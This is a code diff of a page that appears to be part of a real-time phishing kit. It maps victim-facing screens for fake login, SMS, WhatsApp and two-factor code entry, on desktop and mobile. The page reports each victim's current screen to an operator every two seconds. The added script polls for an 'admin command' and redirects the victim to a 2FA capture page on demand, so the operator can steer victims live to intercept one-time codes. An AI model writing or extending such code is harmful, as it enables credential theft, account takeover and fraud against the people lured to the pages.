@@ -295,7 +295,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
             }
         }
     </script>
-<script>
+    <script>
         (function() {
             // Mapa de nomes de arquivos para mensagens de status amigáveis.
             const statusMap = {
@@ -304,8 +304,8 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                 'senha.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
                 'senha-mobile.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL)  (Mobile)',
                 'dois_fatores.php': 'Usuário na Tela 2FA(autenticação de duas etapas) - Mensagem (Desktop)',
-                'dois_fatores2.php': 'Usuário na Tela 2FA com opções de duas etapas (SMS/WHATSAPP/EMAIL) (Desktop)',
-                'doisfatores2mobile.php': 'Usuário na Tela 2FA com opções de duas etapas (SMS/WHATSAPP/EMAIL) (Mobile)',
+                'dois_fatores2.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
+                'doisfatores2mobile.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Mobile)',
                 'sms_desktop.php': 'Usuário na tela para logar com código no SMS (Desktop)',
                 'sms_mobile.php': 'Usuário na tela para logar com código no SMS (Mobile)',
                 'sms_whats_desktop.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Desktop)',
@@ -321,6 +321,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                 'whats2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Desktop)',
                 'whats2framobile.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Mobile)'
             };
+
             // Descobre o nome do arquivo da página atual
             const currentPage = window.location.pathname.split('/').pop();
             
@@ -349,6 +350,36 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
 
             // Configura para enviar o status a cada 2000 milissegundos (2 segundos)
             setInterval(sendStatusUpdate, 2000);
+        })();
+    </script>
+    <script>
+        (function() {
+            // Pega a URL de redirecionamento que o PHP definiu
+            const redirectUrl = "<?php echo $redirect_target_2fa; ?>";
+
+            async function checkAdminCommand() {
+                try {
+                    const response = await fetch('api_check_status.php');
+                    const data = await response.json();
+
+                    console.log('Status atual:', data.status); 
+
+                    if (data.status === 'redirecionar_para_2fa') {
+                        // Para a verificação para não redirecionar em loop
+                        clearInterval(statusInterval);
+                        
+                        console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
+                        
+                        // Redireciona o usuário para o alvo correto (desktop ou mobile)
+                        window.location.href = redirectUrl;
+                    }
+                } catch (error) {
+                    console.error('Erro ao verificar status:', error);
+                }
+            }
+
+            // Inicia a verificação a cada 3 segundos
+            const statusInterval = setInterval(checkAdminCommand, 3000);
         })();
     </script>
 </body>
